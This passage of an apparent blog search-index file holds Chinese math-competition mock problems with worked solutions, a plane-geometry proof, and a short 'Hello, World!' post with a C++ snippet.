\tag{1}<br>\end{equation}</p><p>又注意到$\angle BMP=\angle BFP=90^\circ$, 故$B, M, P, F$四点共圆.</p><p>连接边$FM$, 直角$\triangle AHF$中, $M$为边$AH$中点, 故<br>$$\angle BFM=\angle HFM=\angle FHM=\angle BHH’=\angle BH’M,$$</p><p>即$B, M, H’, F$四点共圆, 从而$B, M, H’, F, P$五点共圆.</p><p>那么连接$H’P$, 由$B, F, P, H’$四点共圆, 知$\angle H’PC=\angle H’BH$.</p><p>又因为<br>\begin{equation*}<br>\begin{aligned}<br>\angle H’OC &amp;= 2\angle H’AC\<br>&amp;=2\angle H’BC\<br>&amp;=\angle HBC+\angle H’BC\<br>&amp;=\angle HBH’.<br>\end{aligned}<br>\end{equation*}</p><p>故$\angle H’OC=\angle H’BH=\angle H’PC$, 即<br>\begin{equation}<br>O, H’, P, C\thinspace\mbox{四点共圆}. \tag{2}<br>\end{equation}</p><p>由$(1), (2)$知, $O, H’, P, G, C$五点共圆.</p><p>因而$\angle APO=\angle OGC$得证.</p><p>综上, 由$(a), (b)$知$\angle ACB=\angle OGC=\angle APO$成立, 进而有$OP\parallel BC$. </p><p><img src="/pic/02.png"></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高联一试模拟试题解答</title>
      <link href="/4/"/>
      <url>/4/</url>
      
        <content type="html"><![CDATA[<h1 id="全国高中数学联合竞赛一试模拟试题"><a href="#全国高中数学联合竞赛一试模拟试题" class="headerlink" title="全国高中数学联合竞赛一试模拟试题"></a>全国高中数学联合竞赛一试模拟试题</h1><h4 id="一、填空题"><a href="#一、填空题" class="headerlink" title="一、填空题"></a><strong>一、填空题</strong></h4><p>**1. ** 若点$P(x, y)$在直线$x+3y-3=0$上移动, 则函数$f(x, y)=3^x+9^y$的最小值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**答案 ** $5(\frac{27}{4})^{\frac{1}{5}}$.</p><p>**解析 ** 点$P(x, y)$在直线$x+3y-3=0$上, 则有$y=\frac{3-x}{3}$, 所以</p><p>\begin{equation*}</p><p>\begin{aligned}</p><p>f(x)&amp;=3^x+9^{\frac{3-x}{3}}=3^x+3^{2-\frac{2x}{3}} \</p><p>&amp;=\frac{1}{2}\cdot 3^x + \frac{1}{2}\cdot 3^x + 3^{1-\frac{2x}{3}} + 3^{1-\frac{2x}{3}} + 3^{1-\frac{2x}{3}} \</p><p>&amp;\ge 5\cdot\sqrt[5]{\frac{1}{2}\cdot 3^x\cdot\frac{1}{2}\cdot 3^x\cdot 3^{1-\frac{2x}{3}}\cdot 3^{1-\frac{2x}{3}}\cdot 3^{1-\frac{2x}{3}}} \</p><p>&amp;=5(\frac{27}{4})^{\frac{1}{5}}.</p><p>\end{aligned}    </p><p>\end{equation*}</p><p>**2. ** 已知方程$x^2+(4+i)x+4+ai=0 ($其中$a\in\mathbb{R})$有实根$b$, 且$z=a+b i$, 那么复数$z=\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**答案 ** $2-2i$.</p><p>**解析 ** 将$x=b$代入方程, 有$(b+2)^2+(a+b)i=0$.  </p><p>分别令实部和虚部为零可得$a=2, b=-2$, 所以$z=2-2i$.</p><p>**3. ** 若实数$x, y$满足$\tan x=x, \tan y=y$, 且$|x|\ne |y|$, 则$\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**答案 ** $0$.</p><p>**解析 ** 由题意, 得</p><p>$$\frac{\sin (x+y)}{x+y}=\frac{\sin (x+y)}{\tan x+\tan y}=\frac{\sin (x+y)}{\frac{\sin x}{\cos x}+\frac{\sin y}{\cos y}}=\cos x\cdot\cos y,$$</p><p>同理</p><p>$$\frac{\sin(x-y)}{x-y} = \frac{\sin(x-y)}{\tan x-\tan y} = \frac{\sin(x-y)}{\frac{\sin x}{\cos x}-\frac{\sin y}{\cos y}}=\cos x \cdot\cos y,$$</p><p>故</p><p>$$\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}=0.$$</p><p>**4. ** $\sum_{k=1}^{2022} \left[\sqrt[4]{\frac{2022}{k}}\right]$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**答案 ** $2183$.</p><p>**解析 ** 所求的值为曲线$y=\sqrt[4]{\frac{2022}{x}}$与$x&gt;0, y&gt;0$所围区域内整点的数目.</p><p>将按列计数改为按行计数, 所求为</p><p>$$\sum_{k=1}^{6}\left[\frac{2022}{k^4}\right]=2022+126+24+7+3+1=2183.$$</p><p>**5. ** 在数列${\left{a_n\right}}$中, $a_n=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})}$, 则数列$\left{ a_n \right}$前2022项的和为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**答案 ** $\frac{1}{2}(1+\sqrt{2022}-\sqrt{2023})$.</p><p>*<em>解析 ** \begin{equation</em>}</p><p>\begin{aligned}</p><p>a_n&amp;=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})} \</p><p>&amp;=\frac{1}{\sqrt{n-1}+\sqrt{n+1}}-\frac{1}{\sqrt{n}+\sqrt{n+1}} \</p><p>&amp;=\frac{\sqrt{n+1}-\sqrt{n-1}}{2}-\sqrt{n+1}+\sqrt{n} \</p><p>&amp;=\frac{(\sqrt{n}-\sqrt{n+1})+(\sqrt{n}-\sqrt{n-1})}{2}.</p><p>\end{aligned}    </p><p>\end{equation*}</p><p>所以</p><p>\begin{equation*}</p><p>\begin{aligned}</p><p>S_{2022}&amp;=\frac{1}{2}(1-\sqrt{2}+\sqrt{2}-\sqrt{3}+\cdots +\sqrt{2022}-\sqrt{2023})+\frac{1}{2}(1-0+\sqrt{2}-1+\cdots +\sqrt{2022}-\sqrt{2021}) \</p><p>&amp;=\frac{1}{2}(1-\sqrt{2023})+\frac{1}{2}\sqrt{2022} \</p><p>&amp;=\frac{1}{2}(1+\sqrt{2022}-\sqrt{2023}).</p><p>\end{aligned}    </p><p>\end{equation*}</p><p>**6. ** 过四面体$ABCD$的顶点$D$作半径为1的球, 该球与四面体$ABCD$的外接球切于点$D$, 且与面$ABC$相切. 若$AD=2\sqrt{3}, \angle BAD=\angle CAD=45^\circ, \angle BAC=60^\circ$, 则四面体的外接球半径$r$为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**答案 ** $3$.</p><p>**解析 ** 过点$D$作平面$ABC$的垂线, 垂足为$H$; 作$DE\bot AB$, 垂足为$E$; 作$DF\bot AC$, 垂足为$F$.</p><p>那么$HE\bot AB$, $HF\bot AC$, 且$AE=AF=AD\cos45^\circ =\sqrt{6}.$</p><p>由$\triangle AEH\cong\triangle AFH$, 得$\angle HAE=30^\circ$, $AH=\frac{AE}{\cos 30^\circ}=2\sqrt{2}, DH=\sqrt{AD^2-AH^2}=2,$ </p><p>故$DH$为半径是$1$的球的直径,</p><p>那么四面体$ABCD$的外接球的球心$O$在$DH$的延长线上, 有</p><p>$$r^2=(r-2)^2+(2\sqrt{2})^2, \Rightarrow r=3.$$</p><p>**7. ** 已知双曲线$\frac{x^2}{a^2}-\frac{y^2}{b^2}=1$的左顶点为$A$, 右焦点为$F$. 设$P$为第一象限中双曲线上的任意一点, 若总有$\angle PFA=2\angle FAP$, 则双曲线的离心率为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**答案 ** $2$.</p><p>**解析 ** 由题设, 可以取双曲线上的点$P$, 使$PF\bot x$轴, 得$P(c, y)$, 则$\frac{c^2}{a^2}-\frac{y^2}{b^2}=1$, </p><p>故$y^2=\frac{b^4}{a^2}$.因为$y&gt;0$, 所以$y=\frac{b^2}{a}=\frac{c^2-a^2}{a}$.</p><p>由$\angle PFA=2\angle FAP =\frac{\pi}{2},$得$\triangle AFP$是等腰三角形, 有$AF=PF$, </p><p>即$a+c=\frac{c^2-a^2}{a}$, 整理得</p><p>$$c^2-ac-2a^2=0, \Rightarrow e^2-e-2=0.$$</p><p>又$e&gt;1,$解得$e=2$.</p><p>**8. ** 正整数集合$A_k$的最小元素为1, 最大元素为2022, 并且各元素可以从小到大排成一个公差为$k$的等差数列, 则并集$A_{43}\cup A_{47}$中的元素个数为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**答案 ** $90$.</p><p>**解析 ** 用$|A_k|$表示集合$A_k$的元素个数.</p><p>设$|A_k|=n+1$, 由$2022=1+nk$, 得$n=\frac{2021}{k}$, 于是</p><p>$$|A_{43}|=\frac{2021}{43}+1=48, |A_{47}|=\frac{2021}{47}+1=44, |A_{43}\cap A_{47}|=|A_{2021}|=\frac{2021}{2021}+1=2,$$</p><p>故</p><p>$$|A_{43}\cup A_{47}|=|A_{43}|+|A_{47}|-|A_{43}\cap A_{47}|=48+44-2=90.$$</p><h4 id="二、解答题"><a href="#二、解答题" class="headerlink" title="二、解答题"></a><strong>二、解答题</strong></h4><p>**9. ** 已知实数$x, y$都在区间$(-2, 2)$内, 且$xy=-1$, 常数$a\in (2, 8)$, 求函数$f(x, y)=\frac{4}{4-x^2}+\frac{a^2}{a^2-y^2}$的最小值.</p><p>**解析 ** 设$m=\frac{x}{2}, n=-\frac{y}{a}, m,n\in (-1, 1), mn=\frac{1}{2a}, f(x, y)=\frac{1}{1-m^2}+\frac{1}{1-n^2}$.</p><p>由柯西不等式, 得</p><p>$$(\frac{1}{1-m^2}+\frac{1}{1-n^2})[(1-m^2)+(1-n^2)]\ge (1+1)^2=4,$$</p><p>所以</p><p>$$f(x,y)\ge\frac{4}{2-(m^2+n^2)}\ge\frac{4}{2-2mn}=\frac{4a}{2a-1},$$</p><p>当$m=n=\frac{1}{\sqrt{2a}},$即$x=\sqrt{\frac{2}{a}}, y=-\sqrt{\frac{a}{2}}\in (-2, 2)$(注意$a\in (2, 8))$时, 不等式中的等号可成立.</p><p>所以函数$f(x, y)$的最小值为$\frac{4a}{2a-1}$.</p><p>**10. ** 椭圆$C:\frac{x^2}{a^2}+\frac{y^2}{b^2}=1(a&gt;b&gt;0)$的左、右焦点分别为$F_1$、$F_2$, 右顶点为$A$, $P$为椭圆上任意一点, 已知$\overrightarrow{PF_1} \cdot \overrightarrow{PF_2}$的最大值为3, 最小值为2.</p><p>(1)求椭圆$C$的方程.</p><p>**解析 ** 椭圆的方程为$C:\frac{x^2}{4}+\frac{y^2}{3}=1$.</p><p>(2)若直线$l:y=kx+m$与椭圆$C$相交于$M, N$两点$(M, N$不是左、右顶点$)$, 且以$MN$为直径的圆过点A, 求证: 直线$l$过顶点, 并求出该定点的坐标.</p><p>**解析 ** 设点$M(x_1, y_1), N(x_2, y_2)$.</p><p>将$y=kx+m$代入椭圆的方程, 得</p><p>$$(4k^2+3)x^2+8kmx+4m^2-12=0,$$</p><p>所以</p><p>$$x_1+x_2=-\frac{8km}{4k^2+3}, x_1x_2=\frac{4m^2-12}{4k^2+3}.$$</p><p>进而$y_1y_2=k^2x_1x_2+km(x_1+x_2)+m^2$.</p><p>因为以$MN$为直径的圆过点$A$, 所以$\overrightarrow{AM}\cdot\overrightarrow{AN}=0$, 所以</p><p>$$7m^2+16km+4k^2=0.$$</p><p>解得$m=-\frac{2}{7}k$, 或$m=-2k$, 均满足$\Delta &gt;0$.</p><p>若$m=-2k$, 直线$l$恒过定点$(2, 0)$, 不合题意, 舍去;</p><p>若$m=-\frac{2}{7}k$, 直线$l:y=k(x-\frac{2}{7})$恒过定点$(\frac{2}{7}, 0)$.</p><p>**11. ** 在等腰$\triangle ABC$中, $AB=AC$. 设$X, Y$分别在边$BC, CA$上, 且$XY//AB$. 记$\triangle CXY$的外心为$D$, $BY$的中点为$E$. 求证:$\angle AED=90^\circ.$</p><p>**解析 ** 过$B$作$BF//AY$, 交$YX$的延长线于$F$.</p><p>由$BF//AY,AB//XY$知四边形$ABFY$为平行四边形.</p><p>由$E$为$BY$的中点,得$E$为$AF$的中点.</p><p>由$AB=AC$,有$\angle ABC = \angle ACB$,于是$\angle YXC=\angle ABC$,从而$YX=YC$.</p><p>连接$FD, DC, DA, DY$,则$\angle FYD = \angle CYD$.</p><p>由$AC=YF,DY=DC,\angle DCA=\angle DYF$,知$\triangle ADC\cong\triangle FDY$.</p><p>有$DA=DF$,而$E$为$AF$的中点,则$DE\bot AF$,即$\angle AED=90^\circ$.</p><p><img src="/pic/01.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/3/"/>
      <url>/3/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>在$\triangle ABC$中, $\angle BAC$的平分线与$\triangle ABC$的外接圆的另一交点为$D$, $M$是$BC$的中点, $P$是过点$M$且垂直于$AD$的直线上一点, 过点$P$且垂直于$PD$的直线与直线$AB, AC$分别交于$E, F$. 求证: $P$是$EF$的中点.</p><p><strong>Proof:</strong></p><p>由点$D$向边$AB, AC$作垂线, 垂足分别为$G, H$. 连接$DE, DF$.</p><p>因为点$D$在$\triangle ABC$的外接圆上, 且$DG\perp AB, DH\perp AC, DM\perp BC$， </p><p>故由$Simson$定理, 知$G, H, M$三点共线. </p><p>又因$AD$平分$\angle BAC$， 故$DG=DH$, 且$GH\perp AD$, 结合$MP\perp AD$，</p><p>知$G, H, M, P$四点共线.</p><p>那么由$\angle DPE=\angle DGE=90^\circ$, 知$P, D, E, G$四点共圆,</p><p>同理知$P, D, F, H$四点共圆.</p><p>那么</p><p>$$\angle DEG=\angle DPG=\angle DFH, \mbox{结合}DG=DH,$$</p><p>知</p><p>$$\triangle DEG \cong\triangle DFH,$$</p><p>那么$DE=DF$. 又$DP\perp EF$, 故$P$为线段$EF$中点.</p><p><img src="/pic/04.png"></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高联一试模拟试题</title>
      <link href="/2/"/>
      <url>/2/</url>
      
        <content type="html"><![CDATA[<h1 id="全国高中数学联合竞赛一试模拟试题"><a href="#全国高中数学联合竞赛一试模拟试题" class="headerlink" title="全国高中数学联合竞赛一试模拟试题"></a>全国高中数学联合竞赛一试模拟试题</h1><h4 id="一、填空题"><a href="#一、填空题" class="headerlink" title="一、填空题"></a><strong>一、填空题</strong></h4><p>**1. ** 若点$P(x, y)$在直线$x+3y-3=0$上移动, 则函数$f(x, y)=3^x+9^y$的最小值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**2. ** 已知方程$x^2+(4+i)x+4+ai=0 ($其中$a\in\mathbb{R})$有实根$b$, 且$z=a+b i$, 那么复数$z=\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**3. ** 若实数$x, y$满足$\tan x=x, \tan y=y$, 且$|x|\ne |y|$, 则$\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**4. ** $\sum_{k=1}^{2022} \left[\sqrt[4]{\frac{2022}{k}}\right]$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**5. ** 在数列${\left{a_n\right}}$中, $a_n=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})}$, 则数列$\left{ a_n \right}$前2022项的和为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**6. ** 过四面体$ABCD$的顶点$D$作半径为1的球, 该球与四面体$ABCD$的外接球切于点$D$, 且与面$ABC$相切. </p><p>若$AD=2\sqrt{3}, \angle BAD=\angle CAD=45^\circ, \angle BAC=60^\circ$, 则四面体的外接球半径$r$为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**7. ** 已知双曲线$\frac{x^2}{a^2}-\frac{y^2}{b^2}=1$的左顶点为$A$, 右焦点为$F$. 设$P$为第一象限中双曲线上的任意一点, 若总有$\angle PFA=2\angle FAP$, 则双曲线的离心率为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p>**8. ** 正整数集合$A_k$的最小元素为1, 最大元素为2022, 并且各元素可以从小到大排成一个公差为$k$的等差数列, 则并集$A_{43}\cup A_{47}$中的元素个数为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><h4 id="二、解答题"><a href="#二、解答题" class="headerlink" title="二、解答题"></a><strong>二、解答题</strong></h4><p>**9. ** 已知实数$x, y$都在区间$(-2, 2)$内, 且$xy=-1$, 常数$a\in (2, 8)$, 求函数$f(x, y)=\frac{4}{4-x^2}+\frac{a^2}{a^2-y^2}$的最小值.</p><p>**10. ** 椭圆$C:\frac{x^2}{a^2}+\frac{y^2}{b^2}=1(a&gt;b&gt;0)$的左、右焦点分别为$F_1$、$F_2$, 右顶点为$A$, $P$为椭圆上任意一点, 已知$\overrightarrow{PF_1} \cdot \overrightarrow{PF_2}$的最大值为3, 最小值为2.</p><p>(1)求椭圆$C$的方程.</p><p>(2)若直线$l:y=kx+m$与椭圆$C$相交于$M, N$两点$(M, N$不是左、右顶点$)$, 且以$MN$为直径的圆过点A, 求证: 直线$l$过顶点, 并求出该定点的坐标.</p><p>**11. ** 在等腰$\triangle ABC$中, $AB=AC$. 设$X, Y$分别在边$BC, CA$上, 且$XY//AB$. 记$\triangle CXY$的外心为$D$, $BY$的中点为$E$. 求证:$\angle AED=90^\circ.$</p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello, World!</title>
      <link href="/1/"/>
      <url>/1/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://chengsx21.github.io/">Endeavor</a>!   </p><p>This is my very first post.   </p><p>If you get any problems when using this site, you can always ask me on <a href="https://github.com/chengsx21/chengsx21.github.io/issues">GitHub</a>.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++"># include &lt;iostream&gt;using namespace std;int main() {    cout &lt;&lt; "Hello world!" &lt;&lt; endl;    cout &lt;&lt; "Welcome to Endeavor!" &lt;&lt; endl;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Programming </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
